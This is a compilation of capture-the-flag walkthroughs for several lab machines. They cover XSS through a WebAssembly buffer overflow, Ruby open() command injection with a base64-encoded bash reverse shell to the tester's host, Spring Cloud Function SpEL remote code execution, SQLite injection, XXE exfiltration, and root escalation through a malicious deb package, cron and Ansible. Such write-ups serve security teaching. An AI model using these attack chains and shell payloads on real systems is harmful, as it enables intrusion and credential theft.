It seems like a cross-site scripting (XSS) attack is required here through the “report” form. There’s no signal that anything I send in the text for that form is reaching. I’ll try a bunch of different XSS payloads, but it is blind, and I never get a connection back.
It does seem likely that if the admin gets a report about a note, they will have to go view that note. I’m not able to get any tags to render in there either:
The next thing I have control over is my name. I’ll register the name 0xdf<b>test</b>, but that seems to be well escaped:
Without any progress on the XSS side, I’ll turn towards better understanding the website in hopes of identifying a vulnerability. The registration form has an interesting limit on the username field:
Usernames are limited to 40 characters. If I try to put more than 40, it just clips it back to 40. However, this is done client-side, so it may be bypassable by editing the request sent to the server.
When loading the page to show a note, it presents an editor but always in read-only mode. Looking at the source for this page, there’s JavaScript on the main page that handles the loading of the note (lines 85-133):
It makes a request to /clipnotes/raw/[note id] and then passes the result to loadClipNote. That uses the content to make a new editor object in read only mode. At the end, there’s a function ccall.
ccall is a function in Enscrypten, a compiler for WebAssembly that compiles C and C++ code into WebAssembly and connects it with JavaScript. The docs show that ccall is for calling compiled C functions like this:
That matches what’s in the code above, calling display, expecting back a number, passing in the created and author as strings. Looking more closely at the resources in use by the page, there is a display.js and a display.wasm:
I can try to reverse this web assembly, but it’s not needed to continue. I’ll look at that in Beyond Root.
Whenever I see arguments being passed to something written in C, I’ll want to check for a buffer overflow. I don’t have any control over the date string at this time, but I can control the username. Additionally, the fact that the client side is limiting usernames to 40 characters suggests that may have been put in as a safeguard (one that is easily bypassed).
To test this, I’ll use the Metasploit utility pattern_create to make a pattern that’s 60 bytes long:
If I paste that into the form and submit, it will look successful. But then when I try to log in, it will fail. The POST request shows it clipped the name at 40 characters:
Notice how that ends with Ab2A and not 8Ab9.  I’ll send that request to Burp Repeater, give it the full 60 character username, and send it. Then I can log in with that 60-character name.
Once logged in, I’ll create a note, it loads just fine, but I’ll note some odd behavior with the note metadata:
The full username is there, and the created string is part of the username. In fact, it’s 48 bytes into the username:
There must be some kind of unsafe copy that overwrites the date string with the end of the username string.
The next question is - given that the date string is likely assumed to be safe, is it being escaped? If not, perhaps I could get some XSS payload in there. I’ll register a username that’s 48 bytes of junk, followed by a simple img tag XSS POC payload that will generate an alert. It works:
The full name is shown, escaped correctly. The “created” time is a failed image load, and the foreground has an alert popup with the message “1”!
For some reason, script tags in the username don’t load. I’ve shown that I can get a line of code running as part of the onerror in an image load (a very common XSS technique). I’ll build from there.
There’s a couple of workarounds to get code running nicely. I went for a method modeled off the fetch call in the legit page above. I’ll start with a simple fetch on my server with the username:
On logging in, submitting a note and viewing it, there’s a request at my server:
I’ll create this file with some simple JavaScript in it:
On refreshing, it gets the file just file:
The next step is to try to use this file to do something. I’ll create this payload that will try to write the contents to the console:
On logging out, registering, logging back in, and creating a note, there’s a hit at my server:
Unfortunately, the contents aren’t printed to the console, but there’s an error message:
Despite the fact that it did fetch the file from my webserver, it then failed and blocked access to the results because of CORS. This page talks about the error and what’s happening. It’s actually an issue that can be fixed at my server.
If the server is under your control, add the origin of the requesting site to the set of domains permitted access by adding it to the Access-Control-Allow-Origin header’s value.
For example, to allow a site at https://example.com to access the resource using CORS, the header should be:
You can also configure a site to allow any site to access it by using the * wildcard.
I need a server that will include that header. ChatGPT can write this for me:
I’ll replace Custom-Header with Access-Control-Allow-Origin and YourCustomHeaderValue with *. I’ll also replace port 8000 with 80 (since I like working on 80, and I give Python in my hacking VM capability to listen on low ports without root).
I’ll start the server:
On refreshing the page, there’s a hit (it looks just like python -m http.server since I’m using that same module):
In the console, now instead of the error there’s the contents of the file in the console:
Having bypassed the CORS issue, I still want to see if I can load code from my server and run it. I’ll update my username by replacing console.log(t) with eval(t):
If this works, there will be an alert window in the browser, and it will mean that I can simple update the local file and refresh, without having to logout, register, log back in, create a post, and view it. On doing that one last time, there’s a hit at my webserver and then an alert on the page:
The plan is to submit this ticket to the admin for review. Getting a popup on their browser isn’t useful (and is counterproductive in the real world). I’ll update xss.js to just an empty file, and go through the process of reporting on of the posts made by this latest user. A few seconds later, there’s a hit on the webserver from Derailed:
This shows that the user on Derailed viewed the XSS note and it worked, meaning that I can run code in that user’s browser.

Category: Shell as rails
I’m interested in seeing what /administration looks like. I’ll write a JavaScript payload that will fetch that and exfil it to me:
I’ll save this resubmit the note for review. I’ll start nc on port 9001 to capture the POST with the page in the body. After a minute, there’s a hit:
One thing to note that code me a bunch of time - The remote fetch won’t work on http://10.10.11.190:3000 or http://127.0.0.1:3000. It has to go for derailed.htb. This is due to same origin policy. It will allow the request just like above, but then exit with an error just like I saw above. That same error will likely occur after the POST to my server, but at that point I don’t care, as I already have the exfil.
I’ll open the page in Firefox, and while the CSS doesn’t load, I can get a general feel for the page:
The interesting part is the “Download” link. It’s actually part of an HTML form:
Clicking the link will create a POST request to /administration/reports. In the POST body, it submits:
I’ll craft a payload that will try to fetch the log file (the intended behaviour) over the XSS.
This will read the /administration page, and get the token from it. Then it will send a POST to /administration/reports requesting the log file. The result will be sent back to me in a POST. After saving this, I’ll submit the report again, and the file hits my nc listening on 9001, with a log file showing the id of the note and the complaint about it:
It’s reasonable to think that perhaps this is trying to open a file named report_19_07_2023.log. I’ll update my payload to try to read a different file. /etc/passwd is always a good place to start. I’ll simply update the report_log parameter in the request, and the next time I submit the report, passwd arrives at nc:
From the /rails/info/routes path, I have a list of the controllers and the function in them assigned to each path on the server. (Without this file I could retrieve this information from config/routes.rb in the application directory.)
There’s a standard naming scheme for Rails application controllers:
Controller class names use CamelCase and have Controller as a suffix. The Controller suffix is always singular. The name of the resource is usually plural.
Controller actions use snake_case and usually match the standard route names Rails defines (index, show, new, create, edit, update, delete).
Controller files go in app/controllers/#{resource_name}_controller.rb.
I expect to find the admin controller in app/controllers/admin_controller.rb. I don’t know the absolute path to the application, but I can use /proc/self/cwd to get there. I’ll update the POST body to report_log=/proc/self/cwd/app/controllers/admin_controller.rb. The source comes back:
I’ve shown a couple times the insecure manner in which Perl uses the open command (recently in Investigation, and before that as diamond injection in Pikaboo).
This post from Bishop Fox shows how Ruby can be abused the same way. The above code shows that the contents of the report_log parameter are passed directly to open. Given that I control that, if I lead that file path with a |, it will execute what follows.
The details are also clear in the Ruby docs:
If path starts with a pipe character ("|"), a subprocess is created, connected to the caller by a pair of pipes. The returned IO object may be used to write to the standard input and read from the standard output of this subprocess.
I’ll start with a simple ping by updating report_log=|ping -c 1 10.10.14.6. I’ll listen with tcpdump, and nn triggering this, there are ICMP packets:
In fact, because the result is POSTed to me, I can see them at nc:
To limit special characters in the payload, I’ll create a bash reverse shell and base64 encode it:
With a little trial and error I found an extra space between -i and >& resulted in no special characters. I’ll update the XSS payload one more time, this time with report_log=|echo 'YmFzaCAtYyAnYmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi80NDMgMD4mMScK' | base64 -d | bash. I’ll trigger the XSS again, and when it runs, a shell arrives at port 443:
I’ll upgrade using the stty / script trick:
I can also grab user.txt now:
I’ll notice that rails is in the ssh group:
This allows for rails to connect over SSH, as defined in the /etc/ssh/sshd_config file here:
I’ll note it also has AllowTcpForwarding no, which means I can’t tunnel over SSH, which is a pain. Originally I went much further before deciding to come back and get a SSH shell as rails, but it makes sense to do it here, even without tunneling. I’ll write my public key into the authorized_keys file, and set the permissions correctly:
Now I can connect:

Category: Shell as openmediavault-webgui
There are two other users with directories in /home:
I can’t access marcus. Looking at marcus’ processes, it seems this user is responsible for running the browser that reviews reports and gets exploited with XSS:
openmediavault-webgui is basically empty, but it’s still useful to know. It’s likely a reference to openmediavault, a network attached storage (NAS) solution, which could unlock additional access.
I’ll note that the name assigned to the openmediavault-webgui user is Toby Wright:
nginx is hosting two sites:
rails-app.conf shows a listener on 3000 that proxies into rails on 3003:
openmediavault-webgui is listening on localhost only, port 80:
There are three folders in /var/www:
html is just the default Debian nginx page. rails-app is clipnotes application. openmediavault looks like an instance of that (which I’ll come back to later).
In rails-app/db there’s a SQLite DB:
There’s a few tables:
Besides junk I submitted, there are two other users, tody and alice:
I’ll grab those two hashes.
There’s also a Git repo in the rails-app directory:
In the first two commits, there’s a file db/seeds.rb. In 15df0bec it’s just the default:
But in 61995bf4, it has alice’s password:
I’ll first check if alice’s hash matches the password from git by putting that into a file, and passing it to hashcat with these two hashes:
hashcat isn’t able to automatically figure out which hash format this is, so I’ll give it -m 3200:
That cracks pretty quickly, showing that this is still alice’s password, and putting that in my hashcat potfile so it doesn’t waste cycles trying to crack it again.
Now I’ll go after toby’s and it cracks as well (a bit slowly, around 8 minutes):
At the end, both passwords are known:
Given toby’s name is on the openmediavault-webgui account, it make sense to check that password for that user, and it works:
openmediavault-webgui is not allow to SSH (because they are not in the ssh group, as shown above):
But that’s ok as I have a very stable SSH shell from rails.

Category: Shell as root
Given the clear signals to look at openmediavault, I’ll want to get a look at it. I already noted that this application is running on port 80 on localhost, and that I can’t SSH tunnel. I’ll upload Chisel:
I’ll start the server on my VM, and connect back to it:
There’s a connection at the server:
Now I have a tunnel from 8888 on my host to 80 on Derailed.
The page presents a login:
None of the passwords I already have work. But the FAQ has a question about resetting the password. I’ll run /sbin/omv-firstaid and it has an option for this:
On following those steps, I’m able to log in.
This GUI has a ton of potential methods to privesc:
I can edit scheduled tasks. Under “Users”, I can edit user’s keys, shell, groups, etc. Unfortunately, for me, all of these are broken. Trying to make changes anywhere, return the same error. For example, trying to give the rails use the root and sudo groups:
In the openmediavault documentation, there’s a page for a tool called omv-confdbadm. It starts:
Most users tend to access/modify the database by using nano:
This is a problem as sometimes a wrong pressed key can add strange chars out of the xml tags and make the database unreadable by the backend.
So the database is the XML file, /etc/openmediavault/config.xml!
There are XML sections for things like usermanagement, network, iptables, crontab, etc.
Some actions that openmediavault executes read/write directly to this file, while others go directly to the host system. For example, when I use omv-firstaid to change the password of the admin user, I don’t see any change in this file. If I look for files changed in the last minute (find / -type f -mmin 1 2>/dev/null), I’ll notice that /etc/shadow changes! It is actually changing the password of the admin account on this box. Still, other things are stored directly in this file, such as SSH keys for users, and others like cronjobs stored in this file and synced to the filesystem (as I’ll show SSH and cron in a bit).
As the help article points out, editing this large XML file in nano or vim can be error prone (especially over a reverse shell…getting SSH here is key). I had a hard time getting omv-confdbadm to write to the DB, but it was invaluable for validating the changes I made (again, will show below).
The openmediavault has an RPC component as well. The omv-rpc tool is in the docs in the same section as omv-confdbadm. The documentation is sketchy, giving only two examples and a link to GitHub to see the different RPCs available.
I’ll try the first example (adding the pipe to jq to pretty print the json):
The link to the various RPC modules is just a folder of .inc PHP files:
Each has an initialize function that registers the different methods that can be called in that module. For example, in apt.inc:
The functions are somewhat documented as far as what they require.
Going through the list of RPCs, the following jump out as interesting:
openmediavault is meant to hold SSH keys for users on the system so that you can connect to the NAS. There is a user’s section in config.xml:
It has a commented out example, as well as two users, rails and test. The example shows where an SSH public key could be stored.
This page has information about the format of the SSH key required. It has an ssh-keygen command to read a “standard” public key and output it in the required RFC 4716 format:
I’m using my small ED25519 key, but RSA format would work fine too.
I’ll edit the test user, replacing the name with “root”, and adding in a key:
I’ll make sure it went in correctly by reading it back using omv-confdbadm:
For this to work, I need the SSH module to refresh. This is where the RPC comes in. I’ll use the config RPC to reload the SSH module:
Once that completes, I can log in as root with my key:
Interestingly, this file does not get written to /root/.ssh/authorized_keys or anything, but rather is managed by openmediavault as a separate authentication on SSH connections.
The same thing works for making a crontab. The crontab section of the “database” starts with only a commented out example:
I’ll copy it to make an uncommented version, and fill it in, with the following discoveries via trial and error:
After saving, I’ll read back the data using omv-confdbadm:
There’s a typo in the example where the closing sendmail tag is missing the /. Not having this will fail with omv-confdbadm (which is why it’s nice to have as a check).
With a valid DB, I’ll reload the cron module using RPC:
I’ll wait a minute, and then my bash backdoor is present:
And I can run it to get a root shell (euid = 0):
Looking at how this works, I’ll find a few files in /etc/cron.d that are managed by openmediavault:
The openmediavault-userdefined on has my job:
That UUID matches what I put in the database, and it’s set to run every minute. userdefined-b8068c15-0d5e-4d38-a7d0-6885a31c8a53 has the commands:
If I change these files, they actually get set back by openmediavault, kept in sync with it’s “DB”.
The intended path for this box is to make a malicious package and install it with the apt RPC. The code comments show that it takes an array of package names to install:
I’ll try creating a package and passing the path as the packages value.
There’s a ton of guides out there about how to create a Deb package. I’ve shown this before in OneTwoSeven. In that example, I downloaded and modified an existing package, ticking up the version so it would install from my server.
Here I’ll just create a dummy empty package with a postinst script that will run after install.
I’ll create a directory to work from, and inside that a DEBIAN directory:
Then I create the control file:
Next I’ll create the postinst script:
I’ll also need to make sure it’s set as executable:
Now dpkg-deb will build it into a .deb file:
I’ll invoke the RPC, and it returns a strange path in /tmp:
But still, /tmp/0xdf2 is there and SetUID:
Regardless of how I got root, I can read the flag:
I’ll explore WASM debugging in this video:
I’m going to be using Chromium, as had a really hard time getting Firefox to step into WASM.
I’ve already found above where the page’s JavaScript is making a call to ccall for the display function, passing in two strings, “created” and “author”. I’ll place a break there (around line 118 of the page), and run to it.
Stepping into ccall actually leads into display.js, which is generated by Escripten when the site is built. ccall is responsible for converting the objects like strings into pointers in memory that the C function can work with. Looking down towards the bottom of the function at line 774 there’s this line:
func is a JavaScript wrapper function funto call the address of display in memory, and it’s being called with cArgs. If I break here and run to it, cArgs is an array of two ints, as shown here in the console:
These are the memory addresses of the two strings. The UTF8ToString function will show the string at each address:
func is getting the assembly from memory and calling the required function:
I’ll step into func, and run to the return asm[name].apply(null, arguments) at the end. Stepping into that is where I hit actually web assembly:
WebAssembly is stack-based, where calls to .get push items onto the stack, and .set pops a value off and stored it in that variable. Function calls also use the stack for arguments and returning results.
In Chromium dev tools, it shows where I am (green highlighted line), as well as the stack (currently empty) and the variables in use on the right:
I won’t get too deep into the actual WASM and what it is legitimately doing to format the page with the post metadata, but I’ll work into it enough to find the overflow.
Some trial and error shows that $func4 is strcpy. This code calls strcpy to copy the date string onto the stack, then moves 48 bytes up the stack and calls strcpy to copy the name. As it’s an unsafe strcpy (which I can tell by trying it and verifying that there’s no length check), the username string writes into the date string.
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 25 Mar 2023
OS : Linux
Base Points : Medium [30]
Nmap scan:
Host is up (0.090s latency).
Not shown: 65532 closed ports                       
PORT     STATE SERVICE                              
22/tcp   open  ssh                                  
80/tcp   open  http                                 
5789/tcp open  unknownCategory: Recon
nmap finds two open TCP ports, SSH (22) and HTTP (80):
Based on the OpenSSH and Apache versions, the host is likely running Ubuntu 22.04 jammy.
Port 80 is showing a redirect to http://qreader.htb/.
The server on 5789 is a Python websockets server.
Given the use of domain names, I’ll do a fuzz with ffuf giving it -ac to filter automatically and -mc all to not hide status codes:
It doesn’t find anything. I can run the same command on 5789, and it finds nothing there as well.
I’ll add this to my /etc/hosts:
The site hosts a QR-code reading / generation service:
I can give it text and it will generate a QR Code:
I can pass the QR code back to the site and get the text:
Passing the same QR to a site like zxing.org shows the same results, so it’s a standard QR code:
There’s also links to download the “Windows” and “Linux” version of the app. That downloads QReader_win_v0.0.2.zip and QReader_lin_v0.0.2.zip.
At the very bottom of the page there’s a “Email Us” button that links to contact@qreader.htb, and a “Submit a report” link that goes to /report:
/report shows a form, and on submitting it, there’s a message added at the top:
I’ll try some cross site scripting (XSS) payloads, but nothing connects back.
While the headers for the site accessed by IP show Apache, once it redirects to qreader.htb, it’s Python:
That fits with a “Made with Flask” message in the footer of the page. The 404 page is also the default flask 404:
I’ll run feroxbuster against the site:
/reader and /embed are the endpoints for going QR <–> text. /report is the form above. /api[*] seems to be a wildcard route that shows the same 404 for anything starting with /api that feroxbuster tries:
TCP 5789 isn’t a pre-defined port, but visiting it in a browser gives a pretty solid clue as to what it’s for:
The websocket was also mentioned in the nmap scan.
There are several things I could do to enumerate these websockets, but I’d need a client and some idea about the messages that are sent over the socket. I’ll go look at the binaries first, as they will likely give information about how to interact with the websocket.
The two zip archives each have an app directory with a binary and a test.png file:
The two images are identical, and present a QR code:
The QR decodes to “kavigihan” (the box author’s handle).
Both binaries have a lot of strings that mention “Python” or “Py” and each has a line mentioning PyInstaller:
PyInstaller files can be reversed to pull typically the full source in a text Python format, but that’s not necessary here (and a bit of a rabbit hole). I’ll show it in Beyond Root.
Running the ELF opens a small GUI application:
I can put text in the field on the right, and it will generate a QR code when I click “Embed”:
The file menu has “Import” (load an image that can then be “Read”), “Save” (save current QR to a file), and “Quit”.
“About” has “Version” and “Update”. When I select “Version” or “Update” it prints an error at the bottom:
Given the implication of network activity, I’ll run it again with Wireshark open. There are DNS queries for ws.qreader.htb:
I’ll add that to my /etc/hosts file pointing at Socket, and the “Version” command works:
It seems a bit odd that the client is getting it’s own version from the server, but that’s what’s happening.
I want to proxy the requests, so I’ll configure Burp to listen on 5789, sending any traffic to Socket on 5789:
Now I’ll update my hosts file to have ws.qreader.htb point to 127.0.0.1, and the requests will go through Burp.
When I do “Version”, it sends:
And in Burp I can see the websocket history:
This is a very strange implementation of web sockets. Typically there’s a single websocket endpoint, and then difference messages are sent to it. This box is using multiple endpoints.

Category: Shell as tkeller
It seems the client is sending the version to the server, and the server is responding with details.
Perhaps it’s reading from a database.
I’ll send one of the “To server” websocket messages to Burp Repeater and mess with it. If I send an invalid version, it says so:
If I add a ' it still returns the same message. However, if I add ", it doesn’t return anything:
This could be the server crashing with an SQL error. I’ll try with a comment to see if it works again, and it does:
That implies that the query looks like:
So my request makes that:
And it works again.
To try to read data, I’ll see if I can use a UNION injection. I’ll need to know the number of columns returned. Given the response, it seems likely that it will be 4 or more, and 4 works:
It is important to remove the 0.0.2 from the front, or else it will get two rows back - one for the 0.0.2 and one for my injection, and then the app just uses the first.
If I try to replace one of the numbers with version(),  nothing comes back. That means it’s likely not mySQL. I’ll check sqlite_version(), and it works:
So it’s sqlite. PayloadsAllTheThings has a nice SQLite Injection page. As the response is only showing one row at a time, I’ll use GROUP_CONCAT (example) to show all the results as one row. For example, I’ll get all the table descriptions:
I’ll focus on the non sqlite_* tables:
I’ll dump the users table. I’m using || to concatenate the data I care about from a row, and then GROUP_CONCAT to show all the rows that way. Still, there’s only one row:
Crackstation breaks the hash easily:
Unfortunately, the username admin over SSH with this password doesn’t work.
The info table has the downloads and conversations stats:
reports gives another couple possible usernames of jason and mike (though these are presumably from customers):
answeres have admin for both usernames:
But, they are both signed Thomas Keller.
With a user’s name and a password, I’ll try to come up with different variations of usernames that could come from that first and last name. Initially I just made a list by hand, but it’s probably easier to just use username-anarchy like I did on Absolute:
To quickly check these, I’ll use crackmapexec:
It finds a match for tkeller.
Now I’ll connect with SSH:
And get user.txt:

Category: Shell as root
The first thing to check on Linux is sudo -l, and it finds something:
tkeller can run build-installer.sh as root without a password.
This Bash script is used to build the PyInstaller application with three actions - “build”, “make”, and “cleanup”.
It starts by checking the command line arguments. If the number isn’t two and the first one isn’t “cleanup”, it prints an error and exits:
Next it sets some variables based on the input and validates that the name isn’t a link:
Then it has three blocks based on the action. “build” checks that the file extension is “spec”, and if so, calls pyinstaller on that spec file:
“make” calls pyinstaller on a Python file:
“cleanup” removes files, and any other action prints an error:
According to the PyInstaller docs, the standard usage for pyinstaller is to pass it a python script (.py file). PyInstaller will analyze the Python script and write a .spec file and then use that to build the stand alone executable. There are cases where you may want to edit a .spec file manually, and that file can also be passed to pyisntaller.
The docs on Spec files show an example .spec file:
This file allows configuration for data files and/or libraries to include, as well as run time options for Python or bundling multiple applications together.
Looking at the docs, the thing that jumps out as exploitable here is the datas parameter. This option is to specify non-binary files the be included with the resulting executable. This could give me file read as root. I’ll play with adding different directories to the binary to see what I can exfil.
Rather than starting with a .spec file from the docs, I’ll use build-installer.sh make to create one. I’ll create an empty Python script, and pass that in:
It writes /tmp/qreader.spec (as well as a bunch of other stuff). That file is:
I don’t have permissions to edit this file, but I’ll copy it to another file, and edit it to include some datas:
Now I’ll run that:
It runs without issue.
I’ll exfil the binary back to my host with nc:
At my host:
This just hangs, so after a few seconds, I’ll kill it, and check the hashes of each:
I’ll use pyinstxtractor to pull out the files:
There’s a bunch of interesting files in there that I had added:
I’ve got root.txt there.
I can use the private key to SSH in as root:
As soon as I saw it was PyInstaller, my immediate thought was to extract the source. This ended up being more of a pain that I expected, and completely unnecessary to solve the box (which is a good lesson on it’s own). That said, I thought it would be valuable to show how to extract the files for this box, as it’s different from previous times I’ve shown this.
There are two steps in recovering Python code from a PyInstaller binary. First is to get the files out of the archive, and then to convert the Python byte-code files back to readable Python. The first step is the same as I’ve always shown.
I’ll use pyinstxtractor to extract the compiled Python modules from the archive:
It reports success, but also notes that the Python version of the binary is 3.10, and I’m running 3.11. It’s important to re-run this with the correct Python version if you want to do decompilation later.
I use the dead snakes repo to have lots of Python versions on my box. You could also easily do this with Docker containers.
I’ll re-run with 3.10 to get the full extraction:
This generates files in a new directory called qreader_extracted.
There’s a ton of files in qreader_extracted. I’ll want to focus on qreader.pyc. This is compiled Python byte-code. To get it back to ASCII Python, I would typically use uncompyle6 (create a virtual environment using the version of Python, pip install it, and run it. But it fails here:
It’s not supported for this version of Python.
The other tool referenced on the PyInstxtractor page is Decompyle++, which is now pycdc. I’ll install with the instructions in this stackoverflow post:
Now I can run it, and it works:
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 11 Mar 2023
OS : Linux
Base Points : Easy [20]
Nmap scan:
Host is up (0.084s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxyCategory: Recon
nmap finds two open TCP ports, SSH (22) and HTTP (8080):
Based on the OpenSSH version, the host is likely running Ubuntu 20.04 focal.
There’s no additional information about the web server running on 8080.
The site is for a cloud storage provider:
The Blogs page (/blogs) has three articles:
But clicking on them doesn’t go to anything.
Trying to register just gives an “Under Construction” message:
At the top right of the page, there’s an upload link, which goes to /upload:
If I try to upload a dummy text file, it rejects it:
If I give it an image, it returns a link to that image:
The link points at /show_image?img=[uploaded image name].
The HTTP headers show nothing interesting:
All of the URL paths end without an extension, and I’m not able to get index.html or index.php to load. The 404 page is interesting:
Googling for that exact message returns a bunch of stuff about Tomcat:
That suggests this is likely a Tomcat server, a Java-based web framework.
I’ll run feroxbuster against the site:
It doesn’t find anything I hadn’t already seen via manual enumeration.

Category: Shell as frank
When I upload an image to the site, the link that comes back goes to /show_image?img=[image name]. In Burp, I can see that it’s returning the raw image:
If I change htb-desktop.png to ., it lists the files in that directory:
I can also perform a directory traversal to leave this directory:
There are two home directories. /home/frank has the standard hidden files / directories, but also a .m2 directory:
It has a settings.xml file. The settings.xml file in a .m2 directory in a user’s home directory is a configuration file used by Apache Maven, a popular build automation tool for Java projects. The settings.xml file contains settings that affect Maven’s behavior, such as the location of the local repository, the list of remote repositories to use, and authentication credentials for accessing remote repositories.
This file does have a password in it:
This password doesn’t work for SSH as frank, phil, or root.
/home/phil has user.txt:
The web user can’t read it.
/var/www has two directories in it, html and WebApp:
html is empty (or inaccessible). WebApp has the root of a Java project:
A pom.xml file is a configuration file used in Java projects that helps manage dependencies and build processes. It contains information about the project, such as its name, version, and dependencies on other software libraries. For my uses, the contents of a pom.xml file allow me to see if the project is using any insecure or out of date libraries by looking at the dependencies listed in the file.
Here, the pom.xml file is:
This file is all about Spring Framework. My first thought is to check for Spring4Shell (CVE-2022-22965), but it doesn’t appear that the necessary components are there (spring-webmvc or spring-webflux).
Digging a bit more into the libraries in this pom.xml, I’ll find CVE-2022-22963, which is referred to as Spring Cloud Function SpEL Injection, and is found in Spring Cloud Function before version 3.2.3. This site is running 3.2.2:
Alternatively, a tool like Snyk can process the pom.xml file and report back any vulnerabilities in the dependencies. In most cases, it would be looking over an entire codebase to find potential vulnerabilities. Still one of the features, “Open Source Security”, analyzes files like a pom.xml that show what public resources are included, and identifies vulnerabilities there.
I’ll open VSCode and the directory containing my copy of the pom.xml file. At first, I wasn’t getting anything back, but that’s because my machine didn’t have Maven (the Java build system) installed, as seen in the Snyk output:
After running sudo apt install maven, it works, and shows several vulnerabilities, including CVE-2022-22963 as identified above:
This GitHub from dinosn has a simple POC to scan for CVE-2022-22963. This script takes a list of urls, and loops over them in threads. For each, it sends an HTTP POST request, and if the response code is 500, the result is success:
A bit before that, it sets the data that will be sent:
Execution appears to be in a specially formatted spring.cloud.function.routing-expression header.
I’ll try sending this request, and it does crash:
It does seem on Inject that anything I send to this endpoint crashes, so it’s not clear to me that this is vulnerable yet.
To test for execution, I’ll replace sleep with ping -c 1 10.10.14.6 to send one ICMP ping to my host. I’ll listen with tcpdump filtering for ICMP traffic on my tun0 interface. When I submit the HTTP request, there’s a ping!
This is blind execution (the response is just a 500 error, without the output of the result). I’ll try a bash reverse shell, but with the special characters in that, it’s likely to not work:
There’s no connection at my nc listening on 443.
I’ll encode the payload with Base64:
With a couple extra spaces I can get rid of the special characters (+ and =):
I can try that as well by sending this:
It still doesn’t connect.
My original solve was to try to use curl to request a payload from my host and pipe that into bash.
I’ll set up a Python webserver (python -m http.server 80) and send this request. There is a request back to my server, but it’s for /shell.sh|bash:
The | is being interpreted as part of the path. Instead, I can save the file in /tmp:
And then send another request to run it:
At nc, there’s a shell:
Brace expansion is something I use daily in bash. For example, when I need to move file_20230313-2046.png to file_20230313-2046-orig.png, I’ll do:
When I submit a payload like this:
Bash expands that to:
Whatever was causing it to fail in the Java layer doesn’t fail any more, and now it works!
I’ll upgrade my shell using the script / stty technique:

Category: Shell as phil
With the file read in the website I already found a password, “DocPhillovestoInject123”. That password didn’t work for SSH as phil:
But it does work to su as phil:
So why can’t phil connect over SSH? They are explicitly denied in the SSHd config (using grep -v ^# to remove lines that start with a comment and grep . to select non-blank lines):
With a shell as phil, I can get user.txt:

Category: Shell as root
There’s a single file in /opt:
It’s a yaml file that is describing tasks:
I’ll ask ChatGPT what this file is, and it identifies it immediately:
Ansible is an open-source automation tool that simplifies the process of managing and configuring IT infrastructure. As ChatGPT identified, this one makes sure that the webapp service is running through systemd.
I’ll use pspy to check for running processes on the host. I’ll download the latest release from their release page (1.2.1 at the time of solving), host it with a Python webserver, and fetch it to Inject with wget:
I’ll make it executable and run it:
Every even minute there’s a flurry of activity, starting with:
root is running ansible-parallel on *.yaml in /opt/automation/tasks.
The tasks folder is owned by root, and writable by the staff group:
phil is in the staff group:
Which means that phil can write to this folder:
The simplest way to run some command via Ansible is with the built-in Shell module. I’ll make a file that’s as simple as:
I’ll save this as /opt/automation/tasks/0xdf.yml. When the cron runs, there’s a new file in /tmp:
This is a copy of bash that’s owned by root with the SetUID bit enabled. So when I run this (with -p to maintain privs), I get a shell as root:
More specifically, it’s with effective userid of 0 / root (check out this post for a detailed breakdown of what’s happening here). Regardless, I can read root.txt:
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 03 Dec 2022
OS : Linux
Base Points : Hard [40]
Nmap scan:
Host is up (0.093s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
6379/tcp open  redisCategory: Recon
nmap finds three open TCP ports, SSH (22), HTTP (80), and Redis (6379):
Based on the OpenSSH and Apache versions, the host is likely running Debian 11 bullseye.
I can connect to Redis with redis-cli (apt install redis), but it doesn’t let me do anything without auth:
The page is a for a company with something about cleaning up pollution:
There’s a contact section at the bottom that includes a domain and an email:
I’ll register with the registration link and log in, which leads to /home . This page has a section with information about the API:
Any entered page address with an extension just redirects to /. Once logged in, it redirects to /home. The site is not running PHP or flat HTML, but something else.
The HTTP response headers don’t give much else besides knowing that the server is Apache:
I’ll run feroxbuster against the site:
In the latest version of feroxbuster, I’ll typically include --dont-extract-links, or else it will flood the page with images and other assets from the site that I can get just by examining the source.
Nothing interesting.
Given the use of domains, I’ll look for subdomains using ffuf:
It finds forum.collect.htb and developers.collect.htb. I’ll add both of those along with collect.htb to my /etc/hosts file:
collect.htb loads the same site as by IP.
forum.collect.htb has a single forum:
The “Member List” link gives a list of potential user names:
The forum has a bunch of posts:
There is information in some of these threads:
If I try to download proxy_history.txt, it redirects to this page that says I can’t because I’m not logged in:
There’s a “Need to register?” link, and once I register, I can download the file.
The file is XML:
The first 24 lines define the structure, and then there’s an items tag, with ten item tags in it. an item looks like:
The url tag has the url for the request. The request and response tags have base64-encoded data that decodes to the request, for example:
The second item is a POST request to http://collect.htb/set/role/admin. The request is:
I’ll note both the PHPSESSID cookie and the token.
The bottom says “Powered by MyBB”, which is a bulletin board software written in PHP. There’s a lot of vulenrabilities in MyBB over time, but they all seem old and don’t match this version.
This site asks for HTTP auth on visiting:
Not much else I can do here for now.

Category: Shell as www-data
I’ve got the request from the Burp History showing a request to /set/role/admin with a token in the POST body. Given that no user is identified, it seems likely that the user who is set as admin is the current user, and perhaps the token is what gives permission to do that.
I’ll try that same request, substituting my cookie for the one in the request:
The response is a 302 redirect to /admin, which seems to suggest it worked.
The admin page allows for me to register users for the API:
On submitting, there’s a background request that’s a POST to /api:
It’s using XML to submit. The response has JSON status:
Any time I see XML submitted to a site I’ll want to check for XML External Entity (XXE) Injection. Because nothing I submit is displayed back in the response, this will be a blind injection. I’ll grab a proof of concept from PayLoadsAllTheThings:
To merge this into the existing payload, I’ll send this POST to Burp Repeater and just add the middle three lines:
When I send this, the response returns that this user already exists, but there’s also a hit at my webserver:
This is successful XXE injection.
Looking at the next few payloads, I’ll build a payload that will load a DTD (Document Type Definition) file from my server. I’ll simply change the previous payload to request from /xxe to xxe.dtd.
Warning: A lot of the payload examples will read /etc/passwd. I’d strongly recommend against this, at least for an initial POC. I’m going to be getting the contents, base64-encoding them, and then making an HTTP GET request back to myself with the results in a GET parameter. The problem with /etc/passwd is that the base64-encoded version may expand beyond the maximum URL length of some clients, which results in nothing coming back. While there is no standard for maximum URL length, PHP will fail here on /etc/passwd, which will make me think my payload is bad, when really it’s just not working on this file. /etc/hostname is a good alternative.
I’ll create xxe.dtd to create a few more entities:
The first line creates a parameter called file that loads the base64-encoded contents of the file /etc/hostname.
